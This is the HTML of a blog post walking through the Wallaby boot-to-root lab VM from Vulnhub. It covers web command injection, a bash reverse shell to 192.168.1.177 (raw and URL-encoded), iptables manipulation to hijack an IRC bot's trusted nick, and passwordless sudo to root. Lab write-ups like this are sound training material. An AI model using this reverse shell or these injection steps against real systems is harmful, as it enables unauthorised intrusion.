@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="[audible]blink ">
+<meta name="description" content="Executive Summary This machine had an unlisted but open webapp path that allowed for remote command execution. After establishing a reverse shell as the limited user www-data, privilege checks showed the user was allowed to modify firewall rules. There was also an IRC server that contained a bot that allowed command execution through the use of the .run command. The command would only obey the user waldo so modification of the firewall allows an attacker to kick and assume the waldo identity." />
+<meta name="keywords" content="hacking, blog, science, infosec, development, programming" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://sec.alexflor.es/posts/2016/12/b2r-wallaby-walkthrough/" />
+
+
+    <title>
+        
+            B2R: Wallaby Walkthrough :: [audible]blink&#39;s &#34; r e s e a r c h &#34; 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">
+
+
+
+
+<meta itemprop="name" content="B2R: Wallaby Walkthrough">
+<meta itemprop="description" content="A walkthrough of the Wallaby VM from Vulnhub">
+<meta itemprop="datePublished" content="2016-12-30T19:16:02-04:00" />
+<meta itemprop="dateModified" content="2016-12-30T19:16:02-04:00" />
+<meta itemprop="wordCount" content="639">
+
+
+
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="B2R: Wallaby Walkthrough"/>
+<meta name="twitter:description" content="A walkthrough of the Wallaby VM from Vulnhub"/>
+
+
+
+    <meta property="article:section" content="Boot2Root" />
+
+
+
+    <meta property="article:published_time" content="2016-12-30 19:16:02 -0400 -0400" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd ~/</span>
+            <span class="logo__cursor" style=""></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://sec.alexflor.es/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>3 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="https://sec.alexflor.es/posts/2016/12/b2r-wallaby-walkthrough/">B2R: Wallaby Walkthrough</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <h2 id="executive-summary">Executive Summary</h2>
+<p>This machine had an unlisted but open webapp path that allowed for remote command execution. After
+establishing a reverse shell as the limited user <code>www-data</code>, privilege checks showed the user was allowed to
+modify firewall rules. There was also an IRC server that contained a bot that allowed command execution
+through the use of the <code>.run</code> command. The command would only obey the user <code>waldo</code> so modification of the
+firewall allows an attacker to kick and assume the <code>waldo</code> identity. Now the <code>.run</code> command could be run and
+a reverse shell with the user <code>wallaby</code> could be established. <code>wallaby</code> had password-less sudo access, so
+elevating to the root user was trivial.</p>
+<h2 id="tools-used">Tools Used</h2>
+<ul>
+<li>nmap - service enumeration</li>
+<li>uniscan - webapp scanner</li>
+</ul>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Upon enumerating available services with nmap, I discovered two ports, 22 and 80. I began to scan with
+<code>uniscan</code> but this failed and caused the VM to move the web application to a different port. It appeared that
+automated tools were going to make this challenge harder, not easier.</p>
+<p>After another scan, we find our new port:</p>
+<p><img src="https://i.imgur.com/U7eKOCh.png" alt="">
+<img src="https://i.imgur.com/xuPADKd.png" alt=""></p>
+<p>Various sorts of manual testing gave us different messages:</p>
+<p><img src="https://i.imgur.com/WwMxNnj.png" alt="">
+<img src="https://i.imgur.com/IS2BlBh.png" alt=""></p>
+<p>At this point, I decided to automate my enumeration of pages with a custom script.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">for word in $(cat /usr/share/dirb/wordlists/common.txt); do
+    
+    # find pages whose last line does NOT contain the phrase 'what are you trying' ( a 404, essentially )
+    curl -q &quot;vm:60080/?page=$word&quot; 2&gt;/dev/null | tail -1 | grep -v 'what are you trying'
+
+    if [[ $? -eq 0 ]]; then
+        #if the last command command completed succesfully, print the word we foun
+        echo $word
+    fi
+done | grep -v &quot;/&quot; # don't print results with slashes in them, they're false positives
+</code></pre><p>This output yielded the pages.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">contact
+mailer
+home
+index
+blacklist
+name
+</code></pre><p>The most interesting page here was <code>mailer</code>:</p>
+<p><img src="https://i.imgur.com/TNJEtuI.png" alt=""></p>
+<p>I attempted to see if the <code>mail</code> query parameter actually passed through as a system command. It did:</p>
+<p><img src="https://i.imgur.com/9Yu6Zky.png" alt=""></p>
+<p>From here we can set up a listener and run a reverse shell by feeding in url encoded commands to the <code>mail</code>
+query parameter:</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.177/443 0&gt;&amp;1&quot;
+
+# becomes
+
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.177%2F443%200%3E%261%22
+</code></pre><p><img src="https://i.imgur.com/tWhvBSP.png" alt=""></p>
+<p>Enumerating this user's privileges and networking, we determine that we have control of firewall rules,
+there's a rule blocking incoming requests to port 6667, and that there's an IRC server running locally.</p>
+<p><img src="https://i.imgur.com/1slTkmg.png" alt=""></p>
+<p><img src="https://i.imgur.com/uxK21ov.png" alt=""></p>
+<p>We can clear the firewall rules with <code>sudo iptables -F</code> and connect to the IRC server from the attacking
+machine.</p>
+<p><img src="https://i.imgur.com/b0NDIKS.png" alt=""></p>
+<p><img src="https://i.imgur.com/IoX9DnK.png" alt=""></p>
+<p>If we try to run the <code>.run</code> command, <code>wallabysbot</code> refuses.</p>
+<p><img src="https://i.imgur.com/R5Vwo3f.png" alt=""></p>
+<p>The code for the and configs for the bot are located in <code>/home/wallaby/.sopel</code> and it indicates that we need
+to assume the nickname <code>waldo</code> in order for us to be able to use this command. We can't do that while waldo
+is still logged in so we boot them off with the use of our firewall.</p>
+<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">sudo iptables -I OUTPUT -p tcp -m owner --uid-owner 1000 --dport 6667 -s 127.0.0.1 -j DROP
+</code></pre><p><img src="https://i.imgur.com/KCH7TX6.png" alt=""></p>
+<p>In a while, after a timeout, only <code>waldo</code> should be ejected from the room, leaving the ability to steal his
+nick and command the bot.</p>
+<p><img src="https://i.imgur.com/1TnwYcT.png" alt=""></p>
+<p>With a reverse shell established, we can see that the wallaby user has full, passwordless <code>sudo</code> access. From
+here, it's just one command to <code>root</code></p>
+<p><img src="https://i.imgur.com/Ds0KVYg.png" alt=""></p>
+<p>Thanks to Waldo and Vulnhub for this frustrating but entertaining VM!</p>
+<h2 id="additional-information">Additional Information</h2>
+<ul>
+<li>User <code>waldo</code> is running irssi within a tmux session. The socket is located in <code>/tmp/tmux-1000</code></li>
+<li>There exists an irssi DoS vulnerability that could have been used to boot the <code>waldo</code> user to assume
+control of the bot.</li>
+<li>The <code>.py</code> modules (which runs python commands), at the time of this writing makes an external call to an
+out-of-scope API. It does not run the python command on the target machine.</li>
+<li>There are at least 3 ways to get a limited shell and at least 2 to get root.</li>
+</ul>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>639 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2016-12-30 18:16 -0500</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+                        <span class="button previous">
+                            <a href="https://sec.alexflor.es/posts/2017/02/configuring-ssh-for-pivoting/">
+                                <span class="button__icon">←</span>
+                                <span class="button__text">Configuring SSH for Pivoting</span>
+                            </a>
+                        </span>
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://sec.alexflor.es/posts/2016/12/b2r-stapler/">
+                                <span class="button__text">B2R: Stapler</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2019</span>
+            
+                <span><a href="https://sec.alexflor.es">[audible]blink</a></span>
+            
+            <span></span>
+            <span> <a href="https://sec.alexflor.es/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+    <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-12497311-8', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+
+
+    </body>
+</html>
